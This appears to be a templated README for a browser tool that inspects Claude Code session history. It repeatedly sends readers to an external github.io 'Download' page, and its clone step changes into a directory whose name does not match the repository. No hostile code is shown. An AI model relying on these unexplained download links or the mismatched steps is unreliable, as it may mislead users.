# CC Quick History Inspector - Local Session History Inspector 2026

> **CC Quick History Inspector is a local web browser tool for searching, organizing, and reviewing Claude Code session history and plans through a focused timeline interface.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bruno-meyer96/cc-quick-history-inspector-win-20859?style=flat-square)](https://github.com/bruno-meyer96/cc-quick-history-inspector-win-20859)

---

<p align="center">
  <a href="https://bruno-meyer96.github.io/cc-quick-history-inspector-win-20859/">
    <img src="https://img.shields.io/badge/Download-CC%20Quick%20History%20Inspector%20Latest-brightgreen?style=for-the-badge" alt="Download CC Quick History Inspector">
  </a>
</p>

> **[Direct Download - CC Quick History Inspector](https://bruno-meyer96.github.io/cc-quick-history-inspector-win-20859/)**

---

[Download Latest Build](https://bruno-meyer96.github.io/cc-quick-history-inspector-win-20859/)

---

## About CC Quick History Inspector

CC Quick History Inspector provides a browser-based way to explore Claude Code session history stored in JSONL data. It brings sessions, plans, project locations, messages, and tool activity into a searchable workspace, making it easier to revisit earlier work without manually scanning individual history files.

The inspector is intended for developers who want a clearer view of their local Claude Code activity. Chronological navigation, project grouping, plan-to-session links, message rendering, and ready-to-paste resume commands help turn historical session data into a practical reference tool.

---

## Features

- Search and filter Claude Code session history.
- Browse activity through a chronological timeline.
- Organize sessions by project and working directory.
- Connect plan files with the sessions that created them.
- Generate ready-to-paste Claude Code commands for resuming sessions.
- Render Markdown plans and assistant messages in the browser.
- Filter messages by role or tool and review tool call summaries.
- Collapse conversation turns, truncate long messages, and copy prompts, responses, plans, or resume commands.
- Store interface preferences in browser `localStorage`.
- Run locally without a build step or external services.

---

## Installation

Clone the repository:

```bash
git clone https://github.com/bruno-meyer96/cc-quick-history-inspector-win-20859.git
cd cc-quick-history-inspector
```

The project runs as a local browser application and does not require a build process. Serve the repository directory with a local web server, then open the displayed address in your browser.

With Node.js installed, one simple option is:

```bash
npx serve .
```

Open the local URL shown by the command and provide access to the relevant Claude Code session history and plan data when prompted by the application.

---

## Usage

1. Start a local server from the project directory.
2. Open the application in a web browser.
3. Load or select the local Claude Code history data.
4. Search for sessions, projects, working directories, plans, messages, or tools.
5. Select a session to inspect its timeline and conversation turns.
6. Use the copy controls to save a prompt, response, plan, or resume command.
7. Paste a generated resume command into Claude Code when you want to continue a session.

The timeline can be narrowed with role and tool filters. Long turns can be collapsed or truncated to make large sessions easier to scan.

---

## Configuration

Interface preferences are stored in the browser's `localStorage`, so display and filtering choices can persist between visits in the same browser profile.

No separate configuration file or build configuration is required for normal use. Run the application from the repository directory and use its browser controls to adjust the session view, filters, and display behavior.

---

## Requirements

- A modern web browser.
- Node.js for the optional local static server workflow.
- Local Claude Code session history and plan data in JSONL-compatible form.
- Enough browser storage for saved interface preferences and the loaded session data.
- No compilation step or external service is required.

---

## FAQ

### Who is this tool for?

It is designed for developers who use Claude Code and want to inspect, search, and revisit local session history and plans.

### Does it modify my session history?

The tool is intended for browsing and reviewing session data. Keep the original files available and follow your own data-handling practices when loading local content.

### How do I update the application?

Download the latest repository build or pull the newest changes, then serve the updated project directory again:

```bash
git pull
npx serve .
```

### Where are interface settings saved?

Browser interface preferences are saved in `localStorage` for the current browser profile.

### Why is the page not loading?

Confirm that the local server is running, open the exact address printed by the server, and check that you launched it from the project directory. A current web browser is also recommended.

### Why can I not find a session?

Verify that the expected history data was loaded and use the project, working-directory, role, and tool filters to broaden or refine the results.

### Can I resume a previous session?

The inspector provides ready-to-paste Claude Code resume commands when the required session information is available.

---

## Roadmap

- Continue refining search and filtering workflows.
- Improve navigation across large session timelines.
- Expand presentation options for plans, messages, and tool activity.
- Preserve a streamlined local-browser experience without a build step.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
